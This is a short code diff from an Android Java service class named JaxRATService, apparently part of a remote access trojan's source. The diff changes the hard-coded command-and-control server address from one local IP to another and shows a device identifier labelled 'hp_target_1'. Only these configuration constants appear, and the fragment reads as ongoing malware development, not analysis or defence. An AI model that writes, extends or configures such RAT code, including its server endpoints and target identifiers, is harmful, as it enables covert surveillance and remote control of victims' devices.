@@ -24,7 +24,7 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class JaxRATService extends Service {
-    private static final String SERVER_URL = "http://192.168.1.52:5000"; 
+    private static final String SERVER_URL = "http://192.168.1.53:5000"; 
     private static final String DEVICE_ID = "hp_target_1"; 
     private static final String CHANNEL_ID = "JaxRAT_Channel";
     
